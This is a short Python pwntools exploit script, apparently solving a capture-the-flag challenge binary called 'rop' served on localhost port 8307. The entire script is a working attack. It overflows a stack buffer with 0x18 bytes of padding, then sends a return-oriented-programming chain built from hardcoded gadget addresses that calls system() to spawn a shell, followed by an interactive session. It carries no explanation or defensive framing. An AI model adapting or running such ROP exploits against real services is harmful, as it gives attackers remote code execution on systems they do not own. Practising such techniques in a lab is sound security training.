from pwn import *

context.arch = 'amd64'

io = remote('localhost', '8307')
# io = process('./rop')

pop_rdi = 0x401d7d
system = 0x40a0e0
ret = 0x401016

io.recvline()
io.sendline(b'/bin/sh')

io.recvline()
io.sendline(b'a'*0x18 + flat([ret, pop_rdi, 0x4a92d0, system]))

io.interactive()


